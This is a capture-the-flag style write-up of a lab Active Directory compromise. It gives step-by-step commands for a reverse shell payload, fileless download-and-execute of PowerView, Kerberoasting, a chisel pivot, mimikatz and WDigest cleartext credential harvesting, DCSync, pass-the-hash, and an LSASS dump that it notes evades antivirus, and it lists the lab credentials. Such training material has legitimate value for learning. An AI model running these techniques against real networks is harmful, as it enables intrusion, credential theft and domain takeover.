# AD Enumeration & Attacks — Skills Assessment Part I

> **Module:** Active Directory Enumeration & Attacks (HTB Academy — CPTS Path)
> **Domain:** `INLANEFREIGHT.LOCAL`
> **Method:** no Metasploit for the initial exploitation
> **Outcome:** Domain Admin via Kerberoasting → pivot → WDigest → DCSync → Pass-the-Hash

This write-up covers a full AD kill chain. It is not a list of commands to copy — it explains the **reasoning** behind each move. A few steps are adapted to a GPU-less Kali (John instead of hashcat) and include the practical issues encountered in the lab.

---

## Attack overview

There are two network segments with a pivot in between. The decisive moment is not a sophisticated exploit but the **observation of the dual-homing** (step 2): without it, you don't realise you need the pivot.

```
External network 10.129.0.0/16
  |
  1. Web foothold (WEB-WIN01)      antak webshell -> reverse shell
  |
  2. Domain + host enum            dual-homed machine -> discover the AD network
  |
  3. Kerberoasting (svc_sql)       TGS -> crack -> lucky7
  |
  4. Pivot with chisel (SOCKS5)    bridge into 172.16.6.0/16
  |
--+-- Internal AD network 172.16.6.0/16
  |
  5. MS01 -> mimikatz + WDigest    tpetty's cleartext password
  |
  6. ACL abuse -> DCSync           tpetty has replication rights
  |
  7. Pass-the-Hash on the DC       Domain Admin -- Game Over
```

| Host | Internal IP | External IP | Role |
|------|-------------|-------------|------|
| WEB-WIN01 | `172.16.6.100` | `10.129.x.x` | Web server (pivot) |
| MS01 | `172.16.6.50` | — | Member server |
| DC01 | `172.16.6.3` | — | Domain Controller |

---

## 1. Foothold — from webshell to reverse shell

We start with the credentials `admin:My_W3bsH3ll_P@ssw0rd!` for the antak webshell left by a colleague in `/uploads`.
<img width="1227" height="748" alt="antak_webshell" src="https://github.com/user-attachments/assets/8d9bfdcb-ab57-47a0-892d-c62425836c72" />


A webshell is convenient but "blind" (one command at a time). We want a real interactive shell, without Metasploit:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4466 -f exe -o shell.exe
```

Upload it via the webshell, open a listener and execute it:

```bash
nc -lvnp 4466
# then from the webshell: C:\shell.exe
```

<img width="633" height="245" alt="shell" src="https://github.com/user-attachments/assets/ba2fd1cf-88b3-4c1e-ad45-c29a6cd69aac" />


Once inside, type `powershell` to access native cmdlets.

---

## 2. Enumeration — understanding where you are

First thing: **who and where you are**.

```powershell
Get-ChildItem Env: | ft key,value   # domain, hostname (WEB-WIN01)
net accounts /domain                # lockout = Never -> you can try without locking out!
ipconfig                            # <- key: the machine is dual-homed
```

`

<img width="658" height="377" alt="dual-homed-ipconfig" src="https://github.com/user-attachments/assets/518b056b-4a92-4ef0-8174-f26f0223d23c" />


Internal host discovery in pure PowerShell (no external tools):

```powershell
6..7 | % { $i=$_; 1..254 | % { if(Test-Connection "172.16.$i.$_" -Count 1 -Quiet){ "172.16.$i.$_ UP" } } }
```

<img width="917" height="98" alt="host-discovery" src="https://github.com/user-attachments/assets/8abd56d9-39d2-4cb4-bfbe-7a2ff6bed8e2" />


Found `172.16.6.3` (DC), `172.16.6.50` (MS01), `172.16.6.100` (yourself).

---

## 3. Kerberoasting — the first user credential

Load PowerView and look for accounts with an SPN. **Why SPNs?** They are service accounts: often privileged and with weak/reused passwords, and any domain user can request their TGS.

Fileless PowerView load (in memory, zero disk footprint):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<YOUR_IP>:8080/PowerView.ps1')
```

Then:

```powershell
Get-DomainUser * -spn | select samaccountname,serviceprincipalname
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

<img width="1443" height="820" alt="kerberoasting-evidence" src="https://github.com/user-attachments/assets/3ec2ff56-7ee0-458d-b1b6-13f4876dbb55" />


You get the `$krb5tgs$23$*svc_sql$...` hash. On a GPU-less Kali use **John**, preserving the **asterisks** in the krb5tgs hash:

```bash
/usr/sbin/john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt svc_sql.hash
/usr/sbin/john --show --format=krb5tgs svc_sql.hash
```

Password: `lucky7`.

---

## 4. Pivot with chisel — entering the internal network

From Kali you cannot directly reach `172.16.6.50` (MS01): you are on the external network. You need a tunnel using WEB-WIN01 as a SOCKS5 proxy.

{% hint style="warning" %}
**Binary note:** do not use the system chisel `/usr/bin/chisel` (it's a Linux ELF). You need the **Windows** build on the target.
{% endhint %}

{% hint style="info" %}
**Why chisel and not netsh:** `netsh portproxy` does static port forwarding (one port → one port). To pivot into an entire subnet you need a dynamic SOCKS proxy. Rule: a single port → netsh/ssh -L; a whole network to explore → SOCKS.
{% endhint %}

On the target (server):

```powershell
Invoke-WebRequest http://<YOUR_IP>:8080/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
Test-Path C:\Windows\Temp\chisel.exe          # verify before launching
C:\Windows\Temp\chisel.exe server -p 1234 --socks5
```

`server: Listening on http://0.0.0.0:1234` should appear — the terminal hangs, that's normal, it's listening. Don't close that session.

On Kali (client) — the IP is WEB-WIN01's **external** one (`10.129.x.x`, from `ipconfig`):

```bash
chisel client 10.129.x.x:1234 socks   # opens SOCKS on 127.0.0.1:1080
```

<img width="1907" height="318" alt="setting-up-chisel" src="https://github.com/user-attachments/assets/2b8fbe5f-2afa-4402-9ae8-39b30f25196c" />


Then set `socks5 127.0.0.1 1080` in `/etc/proxychains.conf`. From here, prefix every command aimed at the internal network with `proxychains`.

---

## 5. MS01 — credential dump and the WDigest trick

With `svc_sql:lucky7` you access MS01. **Why evil-winrm?** A credential is a useless key until you know which door it opens. MS01 has port 5985 (WinRM) open → evil-winrm is the tool that speaks that protocol.

```bash
proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7
```

`query user` shows that **tpetty** is logged on the machine → their credentials are in memory (LSASS). Load mimikatz.

{% hint style="warning" %}
**Upload via evil-winrm:** `upload` is an internal client command (Ruby-side), it must be on a **clean line** without comments. Since you're already in `C:\Windows\Temp`, pass only the filename to avoid path corruption:
`upload /tmp/mimikatz/x64/mimikatz.exe mimikatz.exe`
{% endhint %}

<img width="866" height="232" alt="upload-mimikatz" src="https://github.com/user-attachments/assets/a0e12577-192a-48a1-99cf-9257316dcfe2" />


**Important caveat:** mimikatz via evil-winrm almost always fails (`sekurlsa` empty, `privilege::debug` → `RtlAdjustPrivilege c0000061`), because WinRM is a network session with no context to read LSASS. The reliable route is **RDP**:

```bash
proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /p:lucky7 /size:1280x720
```

Inside RDP, run:

```
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

<img width="945" height="811" alt="mimikatz-wdigest" src="https://github.com/user-attachments/assets/42fafa4b-cb0b-444c-b181-ef8b90b5686f" />


On the first pass you only get the NTLM hash. Here's the **WDigest trick**: by forcing that legacy protocol, Windows keeps passwords in cleartext in memory. Enable it, reboot, and on tpetty's next authentication you capture it in cleartext:

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
shutdown.exe /r /t 0 /f
# after reboot, mimikatz again ->
```

tpetty's password: `Sup3rS3cur3D0m@inU2eR`.

---

## 6. ACL abuse — discovering the DCSync rights

tpetty is not an admin, but may hold dangerous ACLs over the domain object.

```powershell
$sid = Convert-NameToSid tpetty
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

You find these GUIDs (the DCSync "magic GUIDs"):

- `1131f6aa-...` → Replicating Directory Changes
- `1131f6ad-...` → Replicating Directory Changes All
- `89e95b76-...` → Replicating Directory Changes In Filtered Set

Together these three = **you can perform DCSync**, i.e. ask the DC to replicate the hashes to you as if you were another domain controller.

{% hint style="info" %}
**BloodHound shortcut:** this step would have been instant with SharpHound/BloodHound — an edge from `tpetty` to the domain labelled `DCSync`. In a real workflow, collect the data as soon as you have the first credential:
`proxychains bloodhound-python -u svc_sql -p lucky7 -d inlanefreight.local -ns 172.16.6.3 -c all --zip`
{% endhint %}

---

## 7. DCSync and Pass-the-Hash — Domain Admin

Impersonating tpetty, run:

```
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

You obtain the Administrator's NTLM hash: `27dedb1dab4d8545c6e1c66fba077da0`.

The hash can't be cracked, but it doesn't need to be: pass it directly to the DC.

```bash
proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
# whoami -> inlanefreight\administrator
```

Game over. The Administrator flag is on the DC's Desktop.

---

## Practical troubleshooting

Real issues encountered in the lab and how to solve them.

**chisel `connection refused`** — the network reaches the host but port 1234 is closed: the server isn't listening (often died with the shell that launched it).

```powershell
netstat -ano | findstr 1234        # must show LISTENING
Start-Process C:\Windows\Temp\chisel.exe -ArgumentList "server -p 1234 --socks5"   # detached launch
```

**Double-pasted command** — unstable reverse shells corrupt pasted input (`...--socks5C:\chisel.exe...`). Type commands **by hand**.

**evil-winrm `upload` → CommandNotFoundException** — `upload` is an internal client command, not a cmdlet. If it has a `#` comment on the line above or text attached, it gets passed to PowerShell and fails. It must be alone on a clean line.

**Corrupted destination path** (`C:\Windows\Temp\C:WindowsTempmimikatz.exe`) — evil-winrm concatenates the current dir with the absolute path. Pass only the filename.

**Test-Path True in one session, False in another** — you're looking at different machines. Lines like `[proxychains] ... 172.16.6.50:5985` indicate that session is on MS01 (5985 = WinRM).

**mimikatz alternative — offline LSASS dump** (bypasses many AVs):

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

```bash
pypykatz lsa minidump lsass.dmp     # on Kali
```

---

## Credentials summary

| User | Credential | Method |
|------|------------|--------|
| `admin` (webshell) | `My_W3bsH3ll_P@ssw0rd!` | provided |
| `svc_sql` | `lucky7` | Kerberoasting + crack |
| `tpetty` | `Sup3rS3cur3D0m@inU2eR` | mimikatz + WDigest |
| `Administrator` | NTLM `27dedb1dab4d8545c6e1c66fba077da0` | DCSync |

---

## Lessons from the lab

> **The access loop** — in front of every new piece (credential / hash / session), always ask yourself: *what does this unlock? how do I spend it?* It's the habit that connects the pieces and turns "following a path" into "thinking like an attacker".

- **Credential + port = door.** As soon as you have a cred, check which ports speak on the target (5985 WinRM, 3389 RDP, 445 SMB) and pick the right tool.
- **BloodHound in the workflow from the start**, not as a fallback. It gives you ACLs, DCSync and privileged paths for free — right where manual reasoning is hardest.
- **Build a repertoire of tricks** (WDigest, offline LSASS dump…) — these accumulate only with experience.

Logical structure of the assessment: `foothold → enum → cred → pivot → lateral → priv esc via ACL → DA`.
